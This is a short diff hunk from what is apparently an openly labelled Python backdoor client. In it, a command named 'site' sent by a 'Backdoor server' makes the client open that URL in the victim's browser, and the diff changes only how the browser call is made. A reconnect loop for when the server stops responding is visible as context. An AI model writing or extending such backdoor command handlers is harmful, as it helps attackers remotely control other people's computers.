@@ -141,7 +141,7 @@ while True:
 
             # --o, Open received URL from the Backdoor server in Backdoor Client Browser
             elif strData[:4] == 'site':
-                webbrowser.get().open_new(strData[4:])
+                webbrowser.get().open(strData[4:], new=2)
 
     # Handle if Backdoor Server not Responding try to Reconnect to Server
     except socket.error():
